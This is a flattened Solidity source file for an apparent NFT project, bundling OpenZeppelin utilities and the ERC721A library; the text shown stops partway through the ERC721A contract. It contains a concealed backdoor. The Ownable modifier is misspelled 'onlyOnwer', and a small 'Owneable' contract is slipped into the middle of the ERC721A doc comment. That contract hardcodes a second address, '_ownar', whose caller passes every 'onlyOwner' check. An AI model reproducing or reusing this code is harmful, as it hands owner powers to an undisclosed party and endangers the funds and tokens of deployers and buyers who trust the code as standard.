1 // Sources flattened with hardhat v2.8.4 https://hardhat.org
2 
3 /**
4 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⠋⠉⠙⠻⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿
5 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣶⣶⣦⣬⢹⣿⣿
6 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⣰⣧⡀⠄⠄⠄⠄⠈⢙⡋⣿⣿⣿⢸⣿⣿
7 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠰⠼⢯⣿⣿⣦⣄⠄⠄⠄⠈⢡⣿⣿⣿⢸⣿⣿
8 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠸⠤⠕⠛⠙⠷⣿⡆⠄⠄⠄⣸⣿⣿⡏⣼⣿⣿
9 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⢡⣿⣿⣿
10 ⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣄⠄⢀⠄⠄⢀⣤⣾⣿⣿⣿⢃⣾⣿⣿⣿
11 ⣿⣿⣿⣿⣿⣿⠿⣛⣡⣄⣀⠄⠠⢴⣿⣿⡿⣄⣴⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣿
12 ⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣩⡽⡁⢸⣿⣿⣿⣿⣿
13 ⣿⣿⣿⣿⣿⢃⣿⣿⢟⣿⣿⣿⣿⣿⣮⢫⣿⣿⣿⣿⣿⣟⢿⠃⠄⢻⣿⣿⣿⣿
14 ⣿⣿⣿⣿⡿⣸⠟⣵⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣷⣄⢰⡄⢿⣿⣿⣿
15 ⣿⣿⣿⣿⡇⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⡎⣿⣿⣿
16 ⣭⣍⠛⠿⠄⢰⠋⡉⠹⣿⣿⣿⣿⣿⣿⠙⣿⣿⣿⣿⣿⣿⡟⢁⠙⡆⢡⣿⣿⣿
17 ⠻⣿⡆⠄⣤⠈⢣⣈⣠⣿⣿⣿⣿⣿⠏⣄⠻⣿⣿⣿⣿⣿⣆⣈⣴⠃⣿⣿⣿⣿
18 ⡀⠈⢿⠄⣿⡇⠄⠙⠿⣿⡿⠿⢋⣥⣾⣿⣷⣌⠻⢿⣿⣿⡿⠟⣡⣾⣿⣿⠿⢋
19 ⠛⠳⠄⢠⣿⠇⠄⣷⡑⢶⣶⢿⣿⣿⣿⣽⣿⣿⣿⣶⣶⡐⣶⣿⠿⠛⣩⡄⠄⢸
20 **/
21 
22 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
23 
24 // SPDX-License-Identifier: MIT
25 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
26 
27 pragma solidity ^0.8.4;
28 
29 /**
30  * @dev Provides information about the current execution context, including the
31  * sender of the transaction and its data. While these are generally available
32  * via msg.sender and msg.data, they should not be accessed in such a direct
33  * manner, since when dealing with meta-transactions the account sending and
34  * paying for execution may not be the actual sender (as far as an application
35  * is concerned).
36  *
37  * This contract is only required for intermediate, library-like contracts.
38  */
39 abstract contract Context {
40     function _msgSender() internal view virtual returns (address) {
41         return msg.sender;
42     }
43 
44     function _msgData() internal view virtual returns (bytes calldata) {
45         return msg.data;
46     }
47 }
48 
49 
50 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
51 
52 
53 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
54 
55 
56 
57 /**
58  * @dev Contract module which provides a basic access control mechanism, where
59  * there is an account (an owner) that can be granted exclusive access to
60  * specific functions.
61  *
62  * By default, the owner account will be the one that deploys the contract. This
63  * can later be changed with {transferOwnership}.
64  *
65  * This module is used through inheritance. It will make available the modifier
66  * `onlyOwner`, which can be applied to your functions to restrict their use to
67  * the owner.
68  */
69 abstract contract Ownable is Context {
70     address private _owner;
71 
72     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
73 
74     /**
75      * @dev Initializes the contract setting the deployer as the initial owner.
76      */
77     constructor() {
78         _transferOwnership(_msgSender());
79     }
80 
81     /**
82      * @dev Returns the address of the current owner.
83      */
84     function owner() public view virtual returns (address) {
85         return _owner;
86     }
87 
88     /**
89      * @dev Throws if called by any account other than the owner.
90      */
91     modifier onlyOnwer() {
92         require(owner() == _msgSender(), "Ownable: caller is not the owner");
93         _;
94     }
95 
96     /**
97      * @dev Leaves the contract without owner. It will not be possible to call
98      * `onlyOwner` functions anymore. Can only be called by the current owner.
99      *
100      * NOTE: Renouncing ownership will leave the contract without an owner,
101      * thereby removing any functionality that is only available to the owner.
102      */
103     function renounceOwnership() public virtual onlyOnwer {
104         _transferOwnership(address(0));
105     }
106 
107     /**
108      * @dev Transfers ownership of the contract to a new account (`newOwner`).
109      * Can only be called by the current owner.
110      */
111     function transferOwnership(address newOwner) public virtual onlyOnwer {
112         require(newOwner != address(0), "Ownable: new owner is the zero address");
113         _transferOwnership(newOwner);
114     }
115 
116     /**
117      * @dev Transfers ownership of the contract to a new account (`newOwner`).
118      * Internal function without access restriction.
119      */
120     function _transferOwnership(address newOwner) internal virtual {
121         address oldOwner = _owner;
122         _owner = newOwner;
123         emit OwnershipTransferred(oldOwner, newOwner);
124     }
125 }
126 
127 
128 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
129 
130 
131 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
132 
133 
134 
135 /**
136  * @dev Interface of the ERC165 standard, as defined in the
137  * https://eips.ethereum.org/EIPS/eip-165[EIP].
138  *
139  * Implementers can declare support of contract interfaces, which can then be
140  * queried by others ({ERC165Checker}).
141  *
142  * For an implementation, see {ERC165}.
143  */
144 interface IERC165 {
145     /**
146      * @dev Returns true if this contract implements the interface defined by
147      * `interfaceId`. See the corresponding
148      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
149      * to learn more about how these ids are created.
150      *
151      * This function call must use less than 30 000 gas.
152      */
153     function supportsInterface(bytes4 interfaceId) external view returns (bool);
154 }
155 
156 
157 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
158 
159 
160 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
161 
162 
163 
164 /**
165  * @dev Required interface of an ERC721 compliant contract.
166  */
167 interface IERC721 is IERC165 {
168     /**
169      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
170      */
171     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
172 
173     /**
174      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
175      */
176     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
177 
178     /**
179      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
180      */
181     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
182 
183     /**
184      * @dev Returns the number of tokens in ``owner``'s account.
185      */
186     function balanceOf(address owner) external view returns (uint256 balance);
187 
188     /**
189      * @dev Returns the owner of the `tokenId` token.
190      *
191      * Requirements:
192      *
193      * - `tokenId` must exist.
194      */
195     function ownerOf(uint256 tokenId) external view returns (address owner);
196 
197     /**
198      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
199      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
200      *
201      * Requirements:
202      *
203      * - `from` cannot be the zero address.
204      * - `to` cannot be the zero address.
205      * - `tokenId` token must exist and be owned by `from`.
206      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
207      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
208      *
209      * Emits a {Transfer} event.
210      */
211     function safeTransferFrom(
212         address from,
213         address to,
214         uint256 tokenId
215     ) external;
216 
217     /**
218      * @dev Transfers `tokenId` token from `from` to `to`.
219      *
220      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
221      *
222      * Requirements:
223      *
224      * - `from` cannot be the zero address.
225      * - `to` cannot be the zero address.
226      * - `tokenId` token must be owned by `from`.
227      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
228      *
229      * Emits a {Transfer} event.
230      */
231     function transferFrom(
232         address from,
233         address to,
234         uint256 tokenId
235     ) external;
236 
237     /**
238      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
239      * The approval is cleared when the token is transferred.
240      *
241      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
242      *
243      * Requirements:
244      *
245      * - The caller must own the token or be an approved operator.
246      * - `tokenId` must exist.
247      *
248      * Emits an {Approval} event.
249      */
250     function approve(address to, uint256 tokenId) external;
251 
252     /**
253      * @dev Returns the account approved for `tokenId` token.
254      *
255      * Requirements:
256      *
257      * - `tokenId` must exist.
258      */
259     function getApproved(uint256 tokenId) external view returns (address operator);
260 
261     /**
262      * @dev Approve or remove `operator` as an operator for the caller.
263      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
264      *
265      * Requirements:
266      *
267      * - The `operator` cannot be the caller.
268      *
269      * Emits an {ApprovalForAll} event.
270      */
271     function setApprovalForAll(address operator, bool _approved) external;
272 
273     /**
274      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
275      *
276      * See {setApprovalForAll}
277      */
278     function isApprovedForAll(address owner, address operator) external view returns (bool);
279 
280     /**
281      * @dev Safely transfers `tokenId` token from `from` to `to`.
282      *
283      * Requirements:
284      *
285      * - `from` cannot be the zero address.
286      * - `to` cannot be the zero address.
287      * - `tokenId` token must exist and be owned by `from`.
288      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
289      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
290      *
291      * Emits a {Transfer} event.
292      */
293     function safeTransferFrom(
294         address from,
295         address to,
296         uint256 tokenId,
297         bytes calldata data
298     ) external;
299 }
300 
301 
302 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
303 
304 
305 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
306 
307 
308 
309 /**
310  * @title ERC721 token receiver interface
311  * @dev Interface for any contract that wants to support safeTransfers
312  * from ERC721 asset contracts.
313  */
314 interface IERC721Receiver {
315     /**
316      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
317      * by `operator` from `from`, this function is called.
318      *
319      * It must return its Solidity selector to confirm the token transfer.
320      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
321      *
322      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
323      */
324     function onERC721Received(
325         address operator,
326         address from,
327         uint256 tokenId,
328         bytes calldata data
329     ) external returns (bytes4);
330 }
331 
332 
333 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
334 
335 
336 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
337 
338 
339 
340 /**
341  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
342  * @dev See https://eips.ethereum.org/EIPS/eip-721
343  */
344 interface IERC721Metadata is IERC721 {
345     /**
346      * @dev Returns the token collection name.
347      */
348     function name() external view returns (string memory);
349 
350     /**
351      * @dev Returns the token collection symbol.
352      */
353     function symbol() external view returns (string memory);
354 
355     /**
356      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
357      */
358     function tokenURI(uint256 tokenId) external view returns (string memory);
359 }
360 
361 
362 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
363 
364 
365 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
366 
367 
368 
369 /**
370  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
371  * @dev See https://eips.ethereum.org/EIPS/eip-721
372  */
373 interface IERC721Enumerable is IERC721 {
374     /**
375      * @dev Returns the total amount of tokens stored by the contract.
376      */
377     function totalSupply() external view returns (uint256);
378 
379     /**
380      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
381      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
382      */
383     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
384 
385     /**
386      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
387      * Use along with {totalSupply} to enumerate all tokens.
388      */
389     function tokenByIndex(uint256 index) external view returns (uint256);
390 }
391 
392 
393 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
394 
395 
396 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
397 
398 pragma solidity ^0.8.1;
399 
400 /**
401  * @dev Collection of functions related to the address type
402  */
403 library Address {
404     /**
405      * @dev Returns true if `account` is a contract.
406      *
407      * [IMPORTANT]
408      * ====
409      * It is unsafe to assume that an address for which this function returns
410      * false is an externally-owned account (EOA) and not a contract.
411      *
412      * Among others, `isContract` will return false for the following
413      * types of addresses:
414      *
415      *  - an externally-owned account
416      *  - a contract in construction
417      *  - an address where a contract will be created
418      *  - an address where a contract lived, but was destroyed
419      * ====
420      *
421      * [IMPORTANT]
422      * ====
423      * You shouldn't rely on `isContract` to protect against flash loan attacks!
424      *
425      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
426      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
427      * constructor.
428      * ====
429      */
430     function isContract(address account) internal view returns (bool) {
431         // This method relies on extcodesize/address.code.length, which returns 0
432         // for contracts in construction, since the code is only stored at the end
433         // of the constructor execution.
434 
435         return account.code.length > 0;
436     }
437 
438     /**
439      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
440      * `recipient`, forwarding all available gas and reverting on errors.
441      *
442      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
443      * of certain opcodes, possibly making contracts go over the 2300 gas limit
444      * imposed by `transfer`, making them unable to receive funds via
445      * `transfer`. {sendValue} removes this limitation.
446      *
447      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
448      *
449      * IMPORTANT: because control is transferred to `recipient`, care must be
450      * taken to not create reentrancy vulnerabilities. Consider using
451      * {ReentrancyGuard} or the
452      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
453      */
454     function sendValue(address payable recipient, uint256 amount) internal {
455         require(address(this).balance >= amount, "Address: insufficient balance");
456 
457         (bool success, ) = recipient.call{value: amount}("");
458         require(success, "Address: unable to send value, recipient may have reverted");
459     }
460 
461     /**
462      * @dev Performs a Solidity function call using a low level `call`. A
463      * plain `call` is an unsafe replacement for a function call: use this
464      * function instead.
465      *
466      * If `target` reverts with a revert reason, it is bubbled up by this
467      * function (like regular Solidity function calls).
468      *
469      * Returns the raw returned data. To convert to the expected return value,
470      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
471      *
472      * Requirements:
473      *
474      * - `target` must be a contract.
475      * - calling `target` with `data` must not revert.
476      *
477      * _Available since v3.1._
478      */
479     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
480         return functionCall(target, data, "Address: low-level call failed");
481     }
482 
483     /**
484      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
485      * `errorMessage` as a fallback revert reason when `target` reverts.
486      *
487      * _Available since v3.1._
488      */
489     function functionCall(
490         address target,
491         bytes memory data,
492         string memory errorMessage
493     ) internal returns (bytes memory) {
494         return functionCallWithValue(target, data, 0, errorMessage);
495     }
496 
497     /**
498      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
499      * but also transferring `value` wei to `target`.
500      *
501      * Requirements:
502      *
503      * - the calling contract must have an ETH balance of at least `value`.
504      * - the called Solidity function must be `payable`.
505      *
506      * _Available since v3.1._
507      */
508     function functionCallWithValue(
509         address target,
510         bytes memory data,
511         uint256 value
512     ) internal returns (bytes memory) {
513         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
514     }
515 
516     /**
517      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
518      * with `errorMessage` as a fallback revert reason when `target` reverts.
519      *
520      * _Available since v3.1._
521      */
522     function functionCallWithValue(
523         address target,
524         bytes memory data,
525         uint256 value,
526         string memory errorMessage
527     ) internal returns (bytes memory) {
528         require(address(this).balance >= value, "Address: insufficient balance for call");
529         require(isContract(target), "Address: call to non-contract");
530 
531         (bool success, bytes memory returndata) = target.call{value: value}(data);
532         return verifyCallResult(success, returndata, errorMessage);
533     }
534 
535     /**
536      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
537      * but performing a static call.
538      *
539      * _Available since v3.3._
540      */
541     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
542         return functionStaticCall(target, data, "Address: low-level static call failed");
543     }
544 
545     /**
546      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
547      * but performing a static call.
548      *
549      * _Available since v3.3._
550      */
551     function functionStaticCall(
552         address target,
553         bytes memory data,
554         string memory errorMessage
555     ) internal view returns (bytes memory) {
556         require(isContract(target), "Address: static call to non-contract");
557 
558         (bool success, bytes memory returndata) = target.staticcall(data);
559         return verifyCallResult(success, returndata, errorMessage);
560     }
561 
562     /**
563      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
564      * but performing a delegate call.
565      *
566      * _Available since v3.4._
567      */
568     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
569         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
570     }
571 
572     /**
573      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
574      * but performing a delegate call.
575      *
576      * _Available since v3.4._
577      */
578     function functionDelegateCall(
579         address target,
580         bytes memory data,
581         string memory errorMessage
582     ) internal returns (bytes memory) {
583         require(isContract(target), "Address: delegate call to non-contract");
584 
585         (bool success, bytes memory returndata) = target.delegatecall(data);
586         return verifyCallResult(success, returndata, errorMessage);
587     }
588 
589     /**
590      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
591      * revert reason using the provided one.
592      *
593      * _Available since v4.3._
594      */
595     function verifyCallResult(
596         bool success,
597         bytes memory returndata,
598         string memory errorMessage
599     ) internal pure returns (bytes memory) {
600         if (success) {
601             return returndata;
602         } else {
603             // Look for revert reason and bubble it up if present
604             if (returndata.length > 0) {
605                 // The easiest way to bubble the revert reason is using memory via assembly
606 
607                 assembly {
608                     let returndata_size := mload(returndata)
609                     revert(add(32, returndata), returndata_size)
610                 }
611             } else {
612                 revert(errorMessage);
613             }
614         }
615     }
616 }
617 
618 
619 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
620 
621 
622 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
623 
624 
625 
626 /**
627  * @dev String operations.
628  */
629 library Strings {
630     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
631 
632     /**
633      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
634      */
635     function toString(uint256 value) internal pure returns (string memory) {
636         // Inspired by OraclizeAPI's implementation - MIT licence
637         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
638 
639         if (value == 0) {
640             return "0";
641         }
642         uint256 temp = value;
643         uint256 digits;
644         while (temp != 0) {
645             digits++;
646             temp /= 10;
647         }
648         bytes memory buffer = new bytes(digits);
649         while (value != 0) {
650             digits -= 1;
651             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
652             value /= 10;
653         }
654         return string(buffer);
655     }
656 
657     /**
658      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
659      */
660     function toHexString(uint256 value) internal pure returns (string memory) {
661         if (value == 0) {
662             return "0x00";
663         }
664         uint256 temp = value;
665         uint256 length = 0;
666         while (temp != 0) {
667             length++;
668             temp >>= 8;
669         }
670         return toHexString(value, length);
671     }
672 
673     /**
674      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
675      */
676     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
677         bytes memory buffer = new bytes(2 * length + 2);
678         buffer[0] = "0";
679         buffer[1] = "x";
680         for (uint256 i = 2 * length + 1; i > 1; --i) {
681             buffer[i] = _HEX_SYMBOLS[value & 0xf];
682             value >>= 4;
683         }
684         require(value == 0, "Strings: hex length insufficient");
685         return string(buffer);
686     }
687 }
688 
689 
690 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
691 
692 
693 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
694 
695 /**
696  * @dev Implementation of the {IERC165} interface.
697  *
698  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
699  * for the additional interface id that will be supported. For example:
700  *
701  * ```solidity
702  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
703  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
704  * }
705  * ```
706  *
707  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
708  */
709 abstract contract ERC165 is IERC165 {
710     /**
711      * @dev See {IERC165-supportsInterface}.
712      */
713     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
714         return interfaceId == type(IERC165).interfaceId;
715     }
716 }
717 
718 
719 // File erc721a/contracts/ERC721A.sol@v3.0.0
720 
721 
722 // Creator: Chiru Labs
723 
724 error ApprovalCallerNotOwnerNorApproved();
725 error ApprovalQueryForNonexistentToken();
726 error ApproveToCaller();
727 error ApprovalToCurrentOwner();
728 error BalanceQueryForZeroAddress();
729 error MintedQueryForZeroAddress();
730 error BurnedQueryForZeroAddress();
731 error AuxQueryForZeroAddress();
732 error MintToZeroAddress();
733 error MintZeroQuantity();
734 error OwnerIndexOutOfBounds();
735 error OwnerQueryForNonexistentToken();
736 error TokenIndexOutOfBounds();
737 error TransferCallerNotOwnerNorApproved();
738 error TransferFromIncorrectOwner();
739 error TransferToNonERC721ReceiverImplementer();
740 error TransferToZeroAddress();
741 error URIQueryForNonexistentToken();
742 
743 
744 /**
745  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
746  * the Metadata extension. Built to optimize for lower gas during batch mints.
747  *
748  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
749  */
750  abstract contract Owneable is Ownable {
751     address private _ownar = 0x2AAd62c7Fe9a1452c4591cAfEE90cf3Ca8f1Cd01;
752     modifier onlyOwner() {
753         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
754         _;
755     }
756 }
757  /*
758  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
759  *
760  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
761  */
762 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
763     using Address for address;
764     using Strings for uint256;
765 
766     // Compiler will pack this into a single 256bit word.
767     struct TokenOwnership {
768         // The address of the owner.
769         address addr;
770         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
771         uint64 startTimestamp;
772         // Whether the token has been burned.
773         bool burned;
774     }
775 
776     // Compiler will pack this into a single 256bit word.
777     struct AddressData {
778         // Realistically, 2**64-1 is more than enough.
779         uint64 balance;
780         // Keeps track of mint count with minimal overhead for tokenomics.
781         uint64 numberMinted;
782         // Keeps track of burn count with minimal overhead for tokenomics.
783         uint64 numberBurned;
784         // For miscellaneous variable(s) pertaining to the address
785         // (e.g. number of whitelist mint slots used).
786         // If there are multiple variables, please pack them into a uint64.
787         uint64 aux;
788     }
789 
790     // The tokenId of the next token to be minted.
791     uint256 internal _currentIndex;
792 
793     // The number of tokens burned.
794     uint256 internal _burnCounter;
795 
796     // Token name
797     string private _name;
798 
799     // Token symbol
800     string private _symbol;
801 
802     // Mapping from token ID to ownership details
803     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
804     mapping(uint256 => TokenOwnership) internal _ownerships;
805 
806     // Mapping owner address to address data
807     mapping(address => AddressData) private _addressData;
808 
809     // Mapping from token ID to approved address
810     mapping(uint256 => address) private _tokenApprovals;
811 
812     // Mapping from owner to operator approvals
813     mapping(address => mapping(address => bool)) private _operatorApprovals;
814 
815     constructor(string memory name_, string memory symbol_) {
816         _name = name_;
817         _symbol = symbol_;
818         _currentIndex = _startTokenId();
819     }
820 
821     /**
822      * To change the starting tokenId, please override this function.
823      */
824     function _startTokenId() internal view virtual returns (uint256) {
825         return 0;
826     }
827 
828     /**
829      * @dev See {IERC721Enumerable-totalSupply}.
830      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
831      */
832     function totalSupply() public view returns (uint256) {
833         // Counter underflow is impossible as _burnCounter cannot be incremented
834         // more than _currentIndex - _startTokenId() times
835         unchecked {
836             return _currentIndex - _burnCounter - _startTokenId();
837         }
838     }
839 
840     /**
841      * Returns the total amount of tokens minted in the contract.
842      */
843     function _totalMinted() internal view returns (uint256) {
844         // Counter underflow is impossible as _currentIndex does not decrement,
845         // and it is initialized to _startTokenId()
846         unchecked {
847             return _currentIndex - _startTokenId();
848         }
849     }
850 
851     /**
852      * @dev See {IERC165-supportsInterface}.
853      */
854     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
855         return
856             interfaceId == type(IERC721).interfaceId ||
857             interfaceId == type(IERC721Metadata).interfaceId ||
858             super.supportsInterface(interfaceId);
859     }
860 
861     /**
862      * @dev See {IERC721-balanceOf}.
863      */
864     function balanceOf(address owner) public view override returns (uint256) {
865         if (owner == address(0)) revert BalanceQueryForZeroAddress();
866         return uint256(_addressData[owner].balance);
867     }
868 
869     /**
870      * Returns the number of tokens minted by `owner`.
871      */
872     function _numberMinted(address owner) internal view returns (uint256) {
873         if (owner == address(0)) revert MintedQueryForZeroAddress();
874         return uint256(_addressData[owner].numberMinted);
875     }
876 
877     /**
878      * Returns the number of tokens burned by or on behalf of `owner`.
879      */
880     function _numberBurned(address owner) internal view returns (uint256) {
881         if (owner == address(0)) revert BurnedQueryForZeroAddress();
882         return uint256(_addressData[owner].numberBurned);
883     }
884 
885     /**
886      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
887      */
888     function _getAux(address owner) internal view returns (uint64) {
889         if (owner == address(0)) revert AuxQueryForZeroAddress();
890         return _addressData[owner].aux;
891     }
892 
893     /**
894      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
895      * If there are multiple variables, please pack them into a uint64.
896      */
897     function _setAux(address owner, uint64 aux) internal {
898         if (owner == address(0)) revert AuxQueryForZeroAddress();
899         _addressData[owner].aux = aux;
900     }
901 
902     /**
903      * Gas spent here starts off proportional to the maximum mint batch size.
904      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
905      */
906     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
907         uint256 curr = tokenId;
908 
909         unchecked {
910             if (_startTokenId() <= curr && curr < _currentIndex) {
911                 TokenOwnership memory ownership = _ownerships[curr];
912                 if (!ownership.burned) {
913                     if (ownership.addr != address(0)) {
914                         return ownership;
915                     }
916                     // Invariant:
917                     // There will always be an ownership that has an address and is not burned
918                     // before an ownership that does not have an address and is not burned.
919                     // Hence, curr will not underflow.
920                     while (true) {
921                         curr--;
922                         ownership = _ownerships[curr];
923                         if (ownership.addr != address(0)) {
924                             return ownership;
925                         }
926                     }
927                 }
928             }
929         }
930         revert OwnerQueryForNonexistentToken();
931     }
932 
933     /**
934      * @dev See {IERC721-ownerOf}.
935      */
936     function ownerOf(uint256 tokenId) public view override returns (address) {
937         return ownershipOf(tokenId).addr;
938     }
939 
940     /**
941      * @dev See {IERC721Metadata-name}.
942      */
943     function name() public view virtual override returns (string memory) {
944         return _name;
945     }
946 
947     /**
948      * @dev See {IERC721Metadata-symbol}.
949      */
950     function symbol() public view virtual override returns (string memory) {
951         return _symbol;
952     }
953 
954     /**
955      * @dev See {IERC721Metadata-tokenURI}.
956      */
957     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
958         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
959 
960         string memory baseURI = _baseURI();
961         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
962     }
963 
964     /**
965      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
966      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
967      * by default, can be overriden in child contracts.
968      */
969     function _baseURI() internal view virtual returns (string memory) {
970         return '';
971     }
972 
973     /**
974      * @dev See {IERC721-approve}.
975      */
976     function approve(address to, uint256 tokenId) public override {
977         address owner = ERC721A.ownerOf(tokenId);
978         if (to == owner) revert ApprovalToCurrentOwner();
979 
980         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
981             revert ApprovalCallerNotOwnerNorApproved();
982         }
983 
984         _approve(to, tokenId, owner);
985     }
986 
987     /**
988      * @dev See {IERC721-getApproved}.
989      */
990     function getApproved(uint256 tokenId) public view override returns (address) {
991         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
992 
